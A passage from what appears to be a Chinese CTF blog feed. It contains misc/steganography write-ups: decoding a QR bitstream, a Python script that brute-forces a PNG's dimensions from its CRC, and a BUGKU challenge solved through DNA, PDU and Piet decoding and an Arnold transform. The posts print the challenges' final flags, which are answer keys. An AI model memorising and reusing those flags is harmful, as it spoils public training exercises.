href="http://www.thonky.com/qr-code-tutorial/alphanumeric-mode-encoding/">字母数字模式编码</a></li><li><a href="http://www.thonky.com/qr-code-tutorial/byte-mode-encoding/">字节模式编码</a></li><li><a href="http://www.thonky.com/qr-code-tutorial/kanji-mode-encoding/">汉字模式编码</a></li></ul><p>让我们从上面的数据 D1-D26 开始：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&#x27;01000001&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01100110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01100110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11000110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;00010110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01110111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;10110101&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01000110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01110100&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;00110110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;00010110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11100110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11100110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11110111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01000100&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01110110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01010111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01000100&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;10000110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11110111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01010111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;00110110&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;01010111&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11010000&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;11101100&#x27;</span> \</span><br><span class="line">       <span class="string">&#x27;00010001&#x27;</span></span><br><span class="line">alphanumeric = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:&#x27;</span>.chars</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">str, size</span>)</span><br><span class="line">  str.slice!(<span class="number">0</span>, size)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kanji</span>(<span class="params">num</span>)</span><br><span class="line">  <span class="keyword">if</span> num &gt;= <span class="number">0x1740</span></span><br><span class="line">    (<span class="number">0xC140</span> + num / <span class="number">0xC0</span> * <span class="number">0x100</span> + num % <span class="number">0xC0</span>)</span><br><span class="line">      .chr(<span class="title class_">Encoding</span><span class="symbol">:</span><span class="symbol">:Shift_JIS</span>).encode(<span class="title class_">Encoding</span><span class="symbol">:</span><span class="symbol">:UTF_8</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    (<span class="number">0x8140</span> + num / <span class="number">0xC0</span> * <span class="number">0x100</span> + num % <span class="number">0xC0</span>)</span><br><span class="line">      .chr(<span class="title class_">Encoding</span><span class="symbol">:</span><span class="symbol">:Shift_JIS</span>).encode(<span class="title class_">Encoding</span><span class="symbol">:</span><span class="symbol">:UTF_8</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> mode = read(data, <span class="number">4</span>)</span><br><span class="line">  <span class="keyword">when</span> <span class="string">&#x27;0010&#x27;</span> <span class="comment"># Alphanumeric</span></span><br><span class="line">    count = read(data, <span class="number">9</span>).to_i(<span class="number">2</span>)</span><br><span class="line">    (count / <span class="number">2</span>).times <span class="keyword">do</span></span><br><span class="line">      chunk = read(data, <span class="number">11</span>).to_i(<span class="number">2</span>)</span><br><span class="line">      print alphanumeric[chunk / <span class="number">45</span>] + alphanumeric[chunk % <span class="number">45</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    print alphanumeric[read(data, <span class="number">11</span>).to_i(<span class="number">2</span>)] <span class="keyword">if</span> count.odd?</span><br><span class="line">  <span class="keyword">when</span> <span class="string">&#x27;0100&#x27;</span> <span class="comment"># Byte</span></span><br><span class="line">    count = read(data, <span class="number">8</span>).to_i(<span class="number">2</span>)</span><br><span class="line">    count.times <span class="keyword">do</span></span><br><span class="line">      print read(data, <span class="number">8</span>).to_i(<span class="number">2</span>).chr</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">when</span> <span class="string">&#x27;1000&#x27;</span> <span class="comment"># Kanji</span></span><br><span class="line">    count = read(data, <span class="number">8</span>).to_i(<span class="number">2</span>)</span><br><span class="line">    count.times <span class="keyword">do</span></span><br><span class="line">      print kanji(read(data, <span class="number">13</span>).to_i(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">when</span> <span class="string">&#x27;0000&#x27;</span> <span class="comment"># Terminate</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fail <span class="string">&quot;Unhandled mode <span class="subst">#&#123;mode&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bejson.com/runcode/ruby/">Ruby在线网站</a>运行即可得到</p><p>&#x3D;&#x3D;flag{TgCannotGetHouse}&#x3D;&#x3D;</p><br><p>Python代码同样也没有问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># D1-D26:</span></span><br><span class="line">data = [<span class="string">&#x27;01000001&#x27;</span>, <span class="string">&#x27;01100110&#x27;</span>, <span class="string">&#x27;01100110&#x27;</span>, <span class="string">&#x27;11000110&#x27;</span>, <span class="string">&#x27;00010110&#x27;</span>, <span class="string">&#x27;01110111&#x27;</span>, <span class="string">&#x27;10110101&#x27;</span>, <span class="string">&#x27;01000110&#x27;</span>, <span class="string">&#x27;01110100&#x27;</span>, <span class="string">&#x27;00110110&#x27;</span>, <span class="string">&#x27;00010110&#x27;</span>, <span class="string">&#x27;11100110&#x27;</span>, <span class="string">&#x27;11100110&#x27;</span>, <span class="string">&#x27;11110111&#x27;</span>, <span class="string">&#x27;01000100&#x27;</span>, <span class="string">&#x27;01110110&#x27;</span>, <span class="string">&#x27;01010111&#x27;</span>, <span class="string">&#x27;01000100&#x27;</span>, <span class="string">&#x27;10000110&#x27;</span>, <span class="string">&#x27;11110111&#x27;</span>, <span class="string">&#x27;01010111&#x27;</span>, <span class="string">&#x27;00110110&#x27;</span>, <span class="string">&#x27;01010111&#x27;</span>, <span class="string">&#x27;11010000&#x27;</span>, <span class="string">&#x27;11101100&#x27;</span>, <span class="string">&#x27;00010001&#x27;</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span>.join(data)</span><br><span class="line">data = data[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(data[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/python%E8%A7%A3%E7%A0%81.jpg"></p><p>​<strong>flag{TgCannotGetHouse}</strong></p><p><em><strong>拜拜！</strong></em></p><h2 id="5-参考网站："><a href="#5-参考网站：" class="headerlink" title="5.参考网站："></a>5.参考网站：</h2><p><a href="https://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/">https://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/</a></p><p><a href="https://www.zhihu.com/question/65253283">https://www.zhihu.com/question/65253283</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRC爆破PNG图片宽高原理（以及python代码）</title>
      <link href="/posts/37846.html"/>
      <url>/posts/37846.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-PNG图片的格式"><a href="#1-PNG图片的格式" class="headerlink" title="1.PNG图片的格式"></a>1.PNG图片的格式</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-08-05_08-53-25.jpg"></p><p>(1). png的文件头：8个字节 <code>89 50 4E 47 0D 0A 1A 0A</code> 为 png的文件头（固定）</p><p>(2). 4个字节 <code>00 00 00 0D</code> 十进制为13，代表头部数据块的长度为13</p><p>(3). 4个字节 <code>49 48 44 52</code> ASCII码为IHDR，表明数据块为IHDR</p><p>(4). 13位数据块(IHDR)（红色线条部分）<br>前四个字节代表该图片的宽 <code>00 00 01 FF</code>（不固定，可变）<br>后四个字节代表该图片的高 <code>00 00 01 FF</code>（不固定，可变）<br>后五个字节依次为: Bit depth、ColorType、 Compression method、 Filter method、Interlace method（不固定，可变）</p><p>(5). 剩余四字节为该png的CRC检验码 <code>59 F1 D4 BE</code>，由从IDCH到THDR的十七位字节进行crc计算得到。（黄色线条的部分）</p><br><p>可以使用网站手动验证一下CRC：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-08-05_09-11-19.jpg"></p><p><a href="http://www.ip33.com/crc.html">在线CRC计算网站</a></p><p>根据<code>49 48 44 52 00 00 01 FF 00 00 01 FF 08 06 00 00 00</code> 成功计算出来了CRC的数值：<code>59 F1 D4 BE</code>，和图片中的CRC数值无误！</p><br><hr><h2 id="2-CRC"><a href="#2-CRC" class="headerlink" title="2.CRC"></a>2.CRC</h2><p>影响上图的CRC的有<code>49 48 44 52 00 00 01 FF 00 00 01 FF 08 06 00 00 00</code></p><hr><p><code>49 48 44 52</code> ASCII码为IHDR，表明数据块为IHDR<br><code>00 00 01 FF</code> 图片的宽<br><code>00 00 01 FF</code> 图片的高<br><code>08 06 00 00 00</code> 五个字节依次为: Bit depth、ColorType、 Compression method、 Filter method、Interlace method</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<strong>一般不会考虑最后5个字节的变化，所以可以根据CRC来爆破图片的宽度和高度。因为除了图片宽度和图片高度，再加上忽略的最后5字节，其他的都是固定的，所以只有图片宽度和高度会影响CRC数值。</strong></p><br><hr><h2 id="3-Python爆破图片宽度和高度"><a href="#3-Python爆破图片宽度和高度" class="headerlink" title="3.Python爆破图片宽度和高度"></a>3.Python爆破图片宽度和高度</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;输入同级目录下图片的名称&quot;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_data = <span class="built_in">open</span>(args.f, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">crc32key = zlib.crc32(bin_data[<span class="number">12</span>:<span class="number">29</span>]) <span class="comment"># 计算crc</span></span><br><span class="line">original_crc32 = <span class="built_in">int</span>(bin_data[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="comment"># 原始crc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crc32key == original_crc32: <span class="comment"># 计算crc对比原始crc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    input_ = <span class="built_in">input</span>(<span class="string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> input_ <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;&quot;</span>]:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">4095</span>), <span class="built_in">range</span>(<span class="number">4095</span>)): <span class="comment"># 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度</span></span><br><span class="line">            data = bin_data[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + bin_data[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">            crc32 = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span>(crc32 == original_crc32): <span class="comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nCRC32: <span class="subst">&#123;<span class="built_in">hex</span>(original_crc32)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;宽度: <span class="subst">&#123;i&#125;</span>, hex: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;高度: <span class="subst">&#123;j&#125;</span>, hex: <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><br><p><strong>运行效果：</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-08-05_09-38-19.jpg"></p><br><hr><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>struct.pack: <a href="https://blog.csdn.net/u012842630/article/details/85726870">https://blog.csdn.net/u012842630/article/details/85726870</a></p><p>png宽高被改，crc无脑爆破: <a href="https://blog.csdn.net/qq_61554462/article/details/123599109">https://blog.csdn.net/qq_61554462/article/details/123599109</a></p><p>png图片CRC爆破原理的学习: <a href="https://www.cnblogs.com/yunqian2017/p/14449346.html">https://www.cnblogs.com/yunqian2017/p/14449346.html</a></p><p>CTF-bugku-misc-[隐写3]-png高度隐写和pngCRC校验: <a href="https://blog.csdn.net/m0_43405474/article/details/123361993">https://blog.csdn.net/m0_43405474/article/details/123361993</a></p><p>PNG格式的数据结构: <a href="https://blog.csdn.net/weixin_44949552/article/details/105231309">https://blog.csdn.net/weixin_44949552/article/details/105231309</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU-粉色的猫</title>
      <link href="/posts/24354.html"/>
      <url>/posts/24354.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-获取压缩包密码"><a href="#1-获取压缩包密码" class="headerlink" title="1.获取压缩包密码"></a>1.获取压缩包密码</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/1.png"></p><p>能发现只有4种字符<code>AGCT</code></p><p>所以是DNA 碱基序列编码</p><p>使用在线解码网站，<a href="https://earthsciweb.org/js/bio/dna-writer/">戳我</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/2.png"></p><p>压缩包的解压密码为：<code>CATISSOCUTE</code></p><br><br><h2 id="2-分析文件"><a href="#2-分析文件" class="headerlink" title="2.分析文件"></a>2.分析文件</h2><p>010editor 打开 1 这个文件，文件头为BPG，所以他是BPG格式的图片，该格式详细信息看<a href="https://baike.baidu.com/item/BPG/23322695?fr=aladdin">百度百科</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/3.png"></p><br><p>把文件后缀名改成bpg，然后使用 <code>bpg-0.9.8-win64</code>，下载链接，<a href="https://bellard.org/bpg/">戳我</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/4.png"></p><p>出现了图片，但是我们从图片中，根本获取不到任何有用信息。</p><br><p>所以我们调转枪头，去打开<code>key.txt</code>，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/5.png"></p><p>打开解码网站：<a href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/</a></p><p>我们发现都是<code>0001000D9</code>，可以猜测有可能是<code>PDU编码</code>，这个规律是我发现的，但是如果这几个不是默认的，那<code>0001000D9</code>这个特征就不会存在了。所以以后碰到0001000D9拿到16进制转ascii没有什么线索，可以尝试PDU编码。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/6.png"></p><br><p>现在我们开始一行一行解码：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/7.png"></p><p>可以发现<strong>89504E47</strong>这明显就是PNG的文件头的16进制，我们解密好所有的行，拼接在一起，然后再保存为图片，这个过程太简单跳过。</p><p>图片如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/8.png"></p><br><p>这张图片就引出了一个编程语言，叫<strong>Piet</strong>，详细资料请看：<a href="https://baike.baidu.com/item/Piet/10859049?fr=aladdin">百度百科</a></p><p>不想看的，你就理解为20种颜色进行的编程。所以我们现在就需要去运行这个图片代码。</p><br><p>但是，在去运行这个图片代码之前，我们需要把图片反色一下。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/9.png"></p><p>可以看到百度百科的Piet图片颜色背景是白色，而我们拿到的图片颜色背景是黑色。所以需要反色一下，使用<strong>Stegsolve.jar</strong>进行反色操作。</p><p>反色后的图片如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/solved.bmp"></p><br><p>现在我们打开在线运行Piet语言网站，<a href="https://gabriellesc.github.io/piet/">戳我</a></p><p>先<code>import</code>导入图片，然后再点右边的<code>DEBUGGER</code>然后点绿色的按钮运行Piet语言。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/10.png"></p><p>最终得到key：<code>a=13 b=14</code></p><br><br><h2 id="3-Arnold变换（猫脸变换）"><a href="#3-Arnold变换（猫脸变换）" class="headerlink" title="3.Arnold变换（猫脸变换）"></a>3.Arnold变换（猫脸变换）</h2><p>a&#x3D;13, b&#x3D;14,结合我们的1.bpg的图片样貌，所以认为是Arnold变化，所以我们现在就是要获取变化之前的图片。</p><p>借鉴了该文章的代码，<a href="https://blog.csdn.net/qq_44754132/article/details/109974735?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165935649216782391886795%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165935649216782391886795&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109974735-null-null.142%5Ev37%5Epc_rank_v37&utm_term=python%20arnold&spm=1018.2226.3001.4187">链接</a>，并进行了一些修改，为了是方便使用。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>, choices=[<span class="string">&quot;encode&quot;</span>, <span class="string">&quot;decode&quot;</span>],</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;encode | decode&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)                  </span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数a&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数b&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isSame</span>(<span class="params">img</span>):</span><br><span class="line">    r, c = img.shape</span><br><span class="line">    <span class="keyword">if</span> r != c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;图片宽高不一致!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">img, a, b</span>):</span><br><span class="line">    r, c = img.shape</span><br><span class="line">    p = np.zeros((r, c), np.uint8)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">            x = (i + b * j) % r</span><br><span class="line">            y = (a * i + (a * b + <span class="number">1</span>) * j) % c</span><br><span class="line">            p[x, y] = img[i, j]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dearnold</span>(<span class="params">img, a, b</span>):</span><br><span class="line">    r, c = img.shape</span><br><span class="line">    p = np.zeros((r, c), np.uint8)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">            x = ((a * b + <span class="number">1</span>) * i - b * j) % r</span><br><span class="line">            y = (-a * i + j) % c</span><br><span class="line">            p[x, y] = img[i, j]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">img = cv2.imread(args.f, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isSame(img):</span><br><span class="line">    <span class="keyword">if</span> args.t == <span class="string">&quot;encode&quot;</span>:</span><br><span class="line">        img = arnold(img, a=args.a, b=args.b)</span><br><span class="line">    <span class="keyword">elif</span> args.t == <span class="string">&quot;decode&quot;</span>:</span><br><span class="line">        img = dearnold(img, a=args.a, b=args.b)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">&quot;images&quot;</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><br><p>我们之前只是查看了BPG图片的样貌，并没有进行保存，现在我们使用。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/11.png"></p><p>软件运行目录会出现out.png，现在我们获得到了PNG格式的图片，我们现在就可以使用猫脸变化代码进行变化回之前的样貌。</p><br><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/12.png" alt="12"></p><p>使用之前获取的a&#x3D;13, b&#x3D;14，还有刚刚获得的out.png，我们成功拿到了flag！</p><p><strong>flag{c159549a-5604-4bb7-8a6e-9db9d8b1426a}</strong></p><p>​<em><strong>完结，拜拜！</strong></em></p><br><br><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这道题目涉及到了<code>DNA编码, BPG图片格式，PDU编码，Piet编程语言，猫脸变化</code>，一共是5个知识点，这道题让我受益良多，出题者水平真高啊！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU-蜘蛛侠</title>
      <link href="/posts/37333.html"/>
      <url>/posts/37333.html</url>
      
